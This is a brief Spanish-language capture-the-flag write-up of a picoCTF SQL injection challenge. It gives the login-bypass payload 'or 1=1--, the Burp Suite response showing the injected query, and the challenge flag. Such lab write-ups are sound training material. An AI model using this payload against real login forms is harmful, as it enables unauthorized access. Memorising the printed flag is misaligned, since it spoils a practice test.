## Objetivo
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:57512/).
## Solución
response de burpsuite:
```bash
HTTP/1.1 302 Found
Host: saturn.picoctf.net:57952
Date: Sun, 27 Oct 2024 04:10:59 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.19
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: welcome.php
Content-type: text/html; charset=UTF-8

<pre>username: admin
password: 'or 1=1--
SQL query: SELECT id FROM users WHERE password = ''or 1=1--' AND username = 'admin'
</pre><h1>Logged in!.</h1><p>Your flag is: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}</p>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>picoCTF SQLi Security Challenge</title>
		<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
		<link rel="stylesheet" type="text/css" href="css/style.css">
		<!-- Bootstrap -->
		<link href="css/bootstrap.min.css" rel="stylesheet">
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
		<script src="js/bootstrap.min.js"></script>
	</head>

	<body>
	
		<div class="container">
			<form action="" method="post" class="form-login">
				<h1>Security Challenge</h1>
				<h3>Please log in</h2>
				<label for="inputUsername" class="sr-only">Username</label>
				<input type="text" name="username" id="inputUsername" class="form-control" placeholder="Username" required autofocus>
				<label for="inputPassword" class="sr-only">Password</label>
				<input type="password" name="password" id="inputPassword" class="form-control" placeholder="Password" required>
				<button class="btn btn-lg btn-primary btn-block" type="submit">Log in</button>
			</form>
		</div>
	</body>
</html>
```
## Notas Adicionales
al ingresar cualquier cosa en la casilla de login nos regresa:
```bash
username: admin
password: '
SQL query: SELECT id FROM users WHERE password = ''' AND username = 'admin'
```
vemos que esta usando SQL por lo cual haremos una inyeccion sql sencilla.
`'or 1=1--`
lo cual en efecto nos da acceso pero no hay ninguna flag visible, por lo que utilizare burp suite para ver la redireccion y los responses.
flag: `picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}`
### Referencias
burpsuite